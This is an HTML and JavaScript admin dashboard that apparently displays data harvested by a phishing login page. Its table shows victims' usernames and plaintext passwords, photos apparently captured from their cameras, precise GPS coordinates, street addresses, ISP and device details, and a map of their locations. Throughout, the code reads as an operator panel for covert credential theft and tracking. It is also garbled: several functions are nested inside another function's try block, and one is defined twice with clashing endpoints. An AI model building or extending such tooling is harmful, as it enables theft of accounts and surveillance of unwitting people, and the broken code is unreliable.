<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <link rel="stylesheet" href="/admin.css">
</head>

<body>
    <div class="dashboard">
        <!-- Header -->
        <header class="header">
            <h1>üìä Admin Dashboard</h1>
            <div class="header-actions">
                <span class="admin-badge">Admin</span>
                <a href="/admin-logout" class="logout-btn">Logout</a>
            </div>
        </header>

        <!-- Stats Cards -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-icon">üìã</div>
                <div class="stat-content">
                    <h3 id="total-attempts">0</h3>
                    <p>Total Attempts</p>
                </div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">üì∏</div>
                <div class="stat-content">
                    <h3 id="total-photos">0</h3>
                    <p>Photos Captured</p>
                </div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">üåç</div>
                <div class="stat-content">
                    <h3 id="total-locations">0</h3>
                    <p>Locations</p>
                </div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">üïê</div>
                <div class="stat-content">
                    <h3 id="latest-time">-</h3>
                    <p>Latest Attempt</p>
                </div>
            </div>
        </div>

        <!-- Login Attempts Table -->
        <div class="section">
            <div class="section-header">
                <h2>üìã Recent Login Attempts</h2>
                <button onclick="refreshData()" class="refresh-btn">üîÑ Refresh</button>
            </div>
            <div class="table-container">
                <table id="attempts-table">
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>IP Address</th>
                            <th>Location</th>
                            <th>Device</th>
                            <th>Credentials</th>
                            <th>Photo</th>
                        </tr>
                    </thead>
                    <tbody id="attempts-tbody">
                        <tr>
                            <td colspan="6" style="text-align: center; padding: 40px; color: #888;">
                                Loading data...
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Photo Gallery -->
        <div class="section">
            <div class="section-header">
                <h2>üì∏ Captured Photos</h2>
                <div>
                    <button onclick="deleteAllPhotos()" class="delete-btn"
                        style="background: #e74c3c; margin-right: 10px;">üóëÔ∏è Delete All</button>
                    <button onclick="downloadAllPhotos()" class="download-btn">‚¨áÔ∏è Download All</button>
                </div>
            </div>
            <div class="photo-gallery" id="photo-gallery">
                <p style="text-align: center; padding: 40px; color: #888;">No photos captured yet</p>
            </div>
        </div>

        <!-- Location Map -->
        <div class="section">
            <div class="section-header">
                <h2>üó∫Ô∏è Location Map</h2>
            </div>
            <div id="map-container" class="map-container">
                <iframe id="location-map" width="100%" height="500" frameborder="0"
                    style="border:0; border-radius: 8px;" allowfullscreen></iframe>
            </div>
        </div>
    </div>

    <!-- Lightbox for photos -->
    <div id="lightbox" class="lightbox" onclick="closeLightbox()">
        <span class="lightbox-close">&times;</span>
        <img id="lightbox-img" src="" alt="Photo">
        <div id="lightbox-caption"></div>
        <button id="lightbox-delete-btn" class="lightbox-delete-btn"
            onclick="event.stopPropagation(); deletePhotoFromLightbox()">üóëÔ∏è Delete Photo</button>
    </div>

    <script>
        let attemptsData = [];

        // Load data on page load
        window.addEventListener('load', () => {
            loadData();
        });

        async function loadData() {
            try {
                const response = await fetch('/admin/api/data');
                const data = await response.json();
                attemptsData = data.attempts || [];

                updateStats(data);
                renderAttemptsTable(attemptsData);
                renderPhotoGallery(data.photos || []);
                updateMap(attemptsData);
            } catch (error) {
                console.error('Error loading data:', error);
            }
        }

        function updateStats(data) {
            document.getElementById('total-attempts').textContent = data.attempts.length;
            document.getElementById('total-photos').textContent = data.photos.length;

            // Count unique locations from new format
            const uniqueLocations = new Set(
                data.attempts
                    .map(a => {
                        if (a.location) {
                            try {
                                const locData = typeof a.location === 'string' ? JSON.parse(a.location) : a.location;
                                if (locData.finalLocation && locData.finalLocation.latitude) {
                                    return `${locData.finalLocation.latitude.toFixed(4)},${locData.finalLocation.longitude.toFixed(4)}`;
                                }
                            } catch (e) { }
                        }
                        // Old format fallback
                        if (a.gpsLocation && a.gpsLocation.latitude) {
                            return `${a.gpsLocation.latitude},${a.gpsLocation.longitude}`;
                        }
                        return null;
                    })
                    .filter(l => l !== null)
            ).size;
            document.getElementById('total-locations').textContent = uniqueLocations;

            if (data.attempts.length > 0) {
                const latest = new Date(data.attempts[0].timestamp);
                document.getElementById('latest-time').textContent = formatRelativeTime(latest);
            }
        }

        function renderAttemptsTable(attempts) {
            const tbody = document.getElementById('attempts-tbody');

            if (attempts.length === 0) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; padding: 40px; color: #888;">No login attempts yet</td></tr>';
                return;
            }

            tbody.innerHTML = attempts.map((attempt, index) => {
                const time = new Date(attempt.timestamp).toLocaleString();
                const location = getLocationString(attempt);
                const device = getDeviceString(attempt);
                const photoFilename = getPhotoFilename(attempt.timestamp, attempt.ip);

                return `
                    <tr>
                        <td>${time}</td>
                        <td><code>${attempt.ip}</code></td>
                        <td>${location}</td>
                        <td>${device}</td>
                        <td class="credentials-cell">
                            <div class="credentials-container">
                                <div>
                                    <strong>U:</strong> 
                                    <span class="credential-value masked" id="user-${index}" 
                                          data-value="${escapeHtml(attempt.username || '')}">${maskString(attempt.username || '')}</span>
                                </div>
                                <div>
                                    <strong>P:</strong> 
                                    <span class="credential-value masked" id="pass-${index}" 
                                          data-value="${escapeHtml(attempt.password || '')}">${maskString(attempt.password || '')}</span>
                                </div>
                                <button onclick="toggleCredentials(${index})" class="reveal-btn" id="btn-${index}">üëÅÔ∏è Show</button>
                            </div>
                        </td>
                        <td>
                            ${attempt.photoData ?
                        `<button onclick="viewPhoto('${photoFilename}')" class="view-photo-btn">üì∑ View</button>
                         <button onclick="deletePhoto('${photoFilename}')" class="delete-photo-btn" style="background: #e74c3c; color: white; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer; margin-left: 5px; font-size: 11px;">üóëÔ∏è</button>` :
                        '<span style="color: #999;">No photo</span>'}
                        </td>
                    </tr>
                `;
            }).join('');
        }

        function renderPhotoGallery(photos) {
            const gallery = document.getElementById('photo-gallery');

            if (photos.length === 0) {
                gallery.innerHTML = '<p style="text-align: center; padding: 40px; color: #888;">No photos captured yet</p>';
                return;
            }

            gallery.innerHTML = photos.map(photo => `
                <div class="photo-item" style="position: relative;">
                    <img src="/admin/photo/${photo.filename}" alt="Captured photo" onclick="viewPhoto('${photo.filename}')" style="cursor: pointer;">
                    <div class="photo-overlay">
                        <p>${photo.filename}</p>
                    </div>
                    <button onclick="event.stopPropagation(); deletePhoto('${photo.filename}');" 
                            class="delete-photo-btn" 
                            style="position: absolute; top: 5px; right: 5px; background: #e74c3c; color: white; border: none; border-radius: 4px; padding: 5px 10px; cursor: pointer; font-size: 12px; z-index: 10;"
                            title="Delete photo">üóëÔ∏è</button>
                </div>
            `).join('');
        }

        function updateMap(attempts) {
            const validLocations = [];

            attempts.forEach(a => {
                let loc = null;

                // Try new format
                if (a.location) {
                    try {
                        const locData = typeof a.location === 'string' ? JSON.parse(a.location) : a.location;
                        if (locData.finalLocation && locData.finalLocation.latitude) {
                            loc = locData.finalLocation;
                        }
                    } catch (e) { }
                }

                // Try old format
                if (!loc && a.gpsLocation && a.gpsLocation.latitude) {
                    loc = a.gpsLocation;
                }

                if (loc) {
                    validLocations.push({ gpsLocation: loc });
                }
            });

            if (validLocations.length === 0) {
                document.getElementById('map-container').innerHTML =
                    '<p style="text-align: center; padding: 40px; color: #888;">No GPS locations captured yet</p>';
                return;
            }

            // Use first location as map center
            const center = validLocations[0].gpsLocation;
            const markers = validLocations.map((a, i) =>
                `markers=color:red%7Clabel:${i + 1}%7C${a.gpsLocation.latitude},${a.gpsLocation.longitude}`
            ).join('&');

            const mapUrl = `https://maps.google.com/maps?q=${center.latitude},${center.longitude}&z=10&output=embed`;
            document.getElementById('location-map').src = mapUrl;
        }

        function getLocationString(attempt) {
            // NEW FORMAT: location.finalLocation
            if (attempt.location) {
                try {
                    const locData = typeof attempt.location === 'string' ?
                        JSON.parse(attempt.location) : attempt.location;

                    if (locData.finalLocation) {
                        const loc = locData.finalLocation;
                        let html = '';

                        // GPS-based location (HIGH ACCURACY)
                        if (loc.latitude && loc.accuracy && loc.accuracy < 1000) {
                            html += `üìç <strong>GPS Location</strong><br>`;
                            html += `<strong>Coordinates:</strong> ${loc.latitude.toFixed(6)}¬∞N, ${loc.longitude.toFixed(6)}¬∞E<br>`;
                            html += `<small>Accuracy: ¬±${Math.round(loc.accuracy)}m</small><br>`;

                            if (loc.altitude !== null && loc.altitude !== undefined) {
                                html += `<small>Altitude: ${Math.round(loc.altitude)}m</small><br>`;
                            }
                            if (loc.speed) {
                                html += `<small>Speed: ${(loc.speed * 3.6).toFixed(1)} km/h</small><br>`;
                            }
                            if (loc.heading) {
                                html += `<small>Heading: ${Math.round(loc.heading)}¬∞</small><br>`;
                            }

                            html += `<small style="color: #10b981;">Method: ${locData.captureMethod || 'GPS'}</small>`;

                            // Show detailed address if available
                            if (loc.detailedAddress) {
                                html += `<br><small><strong>Address:</strong> ${loc.detailedAddress.fullAddress || formatDetailedAddress(loc.detailedAddress)}</small>`;
                            }
                            // Show IP context if available
                            if (loc.ipContext && loc.ipContext.city) {
                                html += `<br><small>IP Context: ${loc.ipContext.city}, ${loc.ipContext.country}</small>`;
                            }

                            return html;
                        }

                        // IP-based location with coordinates
                        if (loc.latitude) {
                            const cityInfo = loc.city || loc.ipContext?.city || '';
                            const countryInfo = loc.country || loc.ipContext?.country || '';
                            const regionInfo = loc.region || loc.ipContext?.region || '';

                            html += `üåê <strong>IP-Based Location</strong><br>`;
                            html += `<strong>${cityInfo}${regionInfo ? ', ' + regionInfo : ''}, ${countryInfo}</strong><br>`;
                            html += `<strong>Coordinates:</strong> ${loc.latitude.toFixed(6)}¬∞, ${loc.longitude.toFixed(6)}¬∞<br>`;
                            html += `<small>Accuracy: ~${loc.accuracy || 5000}m (City-level)</small><br>`;

                            if (loc.postal || loc.ipContext?.postal) {
                                html += `<small>Postal: ${loc.postal || loc.ipContext.postal}</small><br>`;
                            }
                            if (loc.isp) {
                                html += `<small>ISP: ${loc.isp}</small><br>`;
                            }
                            if (loc.timezone) {
                                html += `<small>Timezone: ${loc.timezone}</small><br>`;
                            }

                            html += `<small style="color: #f59e0b;">Method: ${locData.captureMethod || loc.source}</small>`;

                            // Show detailed address if reverse geocoded
                            if (loc.detailedAddress) {
                                html += `<br><small><strong>Address:</strong> ${loc.detailedAddress.fullAddress || formatDetailedAddress(loc.detailedAddress)}</small>`;
                            }

                            return html;
                        }

                        // IP context only (no coordinates)
                        if (loc.ipContext && loc.ipContext.city) {
                            return `üåê ${loc.ipContext.city}, ${loc.ipContext.country}<br>
                                    <small>${loc.ipContext.source}</small>`;
                        }
                    }
                }

        // Delete a specific photo
        async function deletePhoto(filename) {
                    if (!confirm(`Are you sure you want to delete ${filename}?`)) {
                        return;
                    }

                    try {
                        const response = await fetch(`/admin/photo/delete/${filename}`, {
                            method: 'DELETE'
                        });

                        const result = await response.json();

                        if (result.success) {
                            alert('Photo deleted successfully');
                            loadData(); // Refresh the data
                        } else {
                            alert('Failed to delete photo: ' + result.error);
                        }
                    } catch (error) {
                        console.error('Error deleting photo:', error);
                        alert('Error deleting photo');
                    }
                }

                // Delete all photos
                async function deleteAllPhotos() {
                    if (!confirm('Are you sure you want to delete ALL photos? This action cannot be undone!')) {
                        return;
                    }

                    try {
                        const response = await fetch('/admin/photo/delete-all', {
                            method: 'DELETE'
                        });

                        const result = await response.json();

                        if (result.success) {
                            alert(`Successfully deleted ${result.count} photo(s)`);
                            loadData(); // Refresh the data
                        } else {
                            alert('Failed to delete photos: ' + result.error);
                        }
                    } catch (error) {
                        console.error('Error deleting photos:', error);
                        alert('Error deleting photos');
                    }
                }
            } catch (e) {
                console.error('Error parsing location:', e);
            }
        }

        // OLD FORMAT: gpsLocation (backwards compatibility)
        if (attempt.gpsLocation && attempt.gpsLocation.latitude) {
            return `üìç ${attempt.gpsLocation.latitude.toFixed(6)}, ${attempt.gpsLocation.longitude.toFixed(6)}<br>
                        <small>¬±${Math.round(attempt.gpsLocation.accuracy || 0)}m</small>`;
        }

        // Fallback to geo (IP from server)
        if (attempt.geo && attempt.geo.city) {
            let html = `üåê ${attempt.geo.city}, ${attempt.geo.country}`;
            if (attempt.geo.latitude && attempt.geo.longitude) {
                html += `<br><small>${attempt.geo.latitude.toFixed(4)}, ${attempt.geo.longitude.toFixed(4)}</small>`;
            }
            return html;
        }

        return '<span style="color: #999;">Unknown</span>';
        }

        // Helper function to format detailed address
        function formatDetailedAddress(addr) {
            const parts = [];
            if (addr.houseNumber && addr.road) {
                parts.push(`${addr.houseNumber} ${addr.road}`);
            } else if (addr.road) {
                parts.push(addr.road);
            }
            if (addr.neighborhood) parts.push(addr.neighborhood);
            if (addr.city || addr.town || addr.village) {
                parts.push(addr.city || addr.town || addr.village);
            }
            if (addr.state) parts.push(addr.state);
            if (addr.postcode) parts.push(addr.postcode);
            if (addr.country) parts.push(addr.country);
            return parts.join(', ');
        }

        function getDeviceString(attempt) {
            if (!attempt.deviceDetails) return '<span style="color: #999;">Unknown</span>';
            const d = attempt.deviceDetails;
            return `${d.platform || 'Unknown'}<br><small>${d.screenResolution || 'Unknown'}</small>`;
        }

        // Mask string with dots
        function maskString(str) {
            if (!str) return '';
            return '‚Ä¢'.repeat(Math.min(str.length, 20)); // Max 20 dots
        }

        // Escape HTML to prevent XSS
        function escapeHtml(str) {
            if (!str) return '';
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        // Toggle credentials visibility
        function toggleCredentials(index) {
            const userSpan = document.getElementById(`user-${index}`);
            const passSpan = document.getElementById(`pass-${index}`);
            const btn = document.getElementById(`btn-${index}`);

            if (!userSpan || !passSpan) return;

            const isMasked = userSpan.classList.contains('masked');

            if (isMasked) {
                // Show real values
                userSpan.textContent = userSpan.dataset.value;
                passSpan.textContent = passSpan.dataset.value;
                userSpan.classList.remove('masked');
                passSpan.classList.remove('masked');
                btn.textContent = 'üôà Hide';
            } else {
                // Mask values
                userSpan.textContent = maskString(userSpan.dataset.value);
                passSpan.textContent = maskString(passSpan.dataset.value);
                userSpan.classList.add('masked');
                passSpan.classList.add('masked');
                btn.textContent = 'üëÅÔ∏è Show';
            }
        }

        function getPhotoFilename(timestamp, ip) {
            const date = new Date(timestamp).toISOString().replace(/:/g, '-');
            const cleanIp = ip.replace(/[.:]/g, '-');
            return `${date}_${cleanIp}.jpg`;
        }

        let currentPhotoFilename = null;

        function viewPhoto(filename) {
            const lightbox = document.getElementById('lightbox');
            const img = document.getElementById('lightbox-img');
            const caption = document.getElementById('lightbox-caption');

            currentPhotoFilename = filename;
            img.src = `/admin/photo/${filename}`;
            caption.textContent = filename;
            lightbox.style.display = 'flex';
        }

        function closeLightbox() {
            document.getElementById('lightbox').style.display = 'none';
            currentPhotoFilename = null;
        }

        async function deletePhoto(filename) {
            if (!confirm(`Are you sure you want to delete ${filename}?`)) {
                return;
            }

            try {
                const response = await fetch(`/admin/photo/${filename}`, {
                    method: 'DELETE'
                });
                const result = await response.json();

                if (result.success) {
                    alert('Photo deleted successfully');
                    refreshData();
                } else {
                    alert('Failed to delete photo: ' + result.message);
                }
            } catch (error) {
                console.error('Error deleting photo:', error);
                alert('Error deleting photo');
            }
        }

        async function deletePhotoFromLightbox() {
            if (!currentPhotoFilename) return;

            closeLightbox();
            await deletePhoto(currentPhotoFilename);
        }

        function refreshData() {
            loadData();
        }

        function downloadAllPhotos() {
            alert('Download all photos functionality - would create a ZIP file of all photos');
        }

        function formatRelativeTime(date) {
            const seconds = Math.floor((new Date() - date) / 1000);
            if (seconds < 60) return `${seconds}s ago`;
            const minutes = Math.floor(seconds / 60);
            if (minutes < 60) return `${minutes}m ago`;
            const hours = Math.floor(minutes / 60);
            if (hours < 24) return `${hours}h ago`;
            const days = Math.floor(hours / 24);
            return `${days}d ago`;
        }

        // Close lightbox on Escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeLightbox();
        });
    </script>
</body>

</html>